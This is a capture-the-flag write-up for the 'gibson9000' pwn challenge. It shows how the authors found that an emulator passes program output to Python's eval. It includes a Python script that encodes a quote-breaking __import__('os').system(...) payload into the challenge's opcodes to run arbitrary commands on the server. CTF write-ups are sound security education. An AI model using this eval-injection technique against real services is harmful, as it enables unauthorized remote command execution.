# gibson9000 - pwn (100 + 0), 15 solves

> can you program our new line of gibson 9000 calcumatron cpus?

in this task we were given a short `readme` file describing a custom computer architecture, and a `host:port`
running an emulator for the arch. the description hinted at possibility of the bug in the emulator 
("emulator was written by an intern").

the opcodes were as follows:
- `*x` - *dptr += x
- `+x` - dptr += x
- `_x` - some conditional jump, didn't need it
- `xx` - print (zero-terminated?) string at dptr
- `mx` - heat -= 1
- `dx` - toggle debug

there was only limited ram (128 bytes), so we immediately thought about the boundary conditions (what if dptr
goes over or under the range 0-127). it seems all of these were taken into account though. after 
an hour of sending random stuff, we managed to crash the emulator. the smallest reproducible example was
`*7*6x0`, which meant (add 7, add 6, print dptr). the emulator sends the following output:
```
input your calculatory opcodez: *7*6x0
result:
traceback (most recent call last):
  file "/home/ctf/chal.py", line 129, in <module>
    dostep()
  file "/home/ctf/chal.py", line 104, in dostep
    print eval('"' + s + '"')
  file "<string>", line 1
    "
    ^
syntaxerror: eol while scanning string literal
```

looks like our string to be printed is evaluated? what the hell. the crash was because our string in this case was
`\r`, which may count as ending the line.

the path to solution is now obvious. escape the sandbox via sending quote char, then some `__import__('os').system('ls')` or
whatever. this simple script allowed us to easily execute arbitrary commands on server:
```python
import sys

def build_char(c):
    c = ord(c)
    s = ""
    while c >= 7:
        s += "*7"
        s += "m0" * 7
        c -= 7
    s += "*%d" % c
    s += "m0" * 7
    s += "+1"
    s += "m0" * 7
    return s

total = ""
for c in '''"+__import__("os").system("%s")#''' % sys.argv[1]:
    total += build_char(c)
print total + "x0"
```
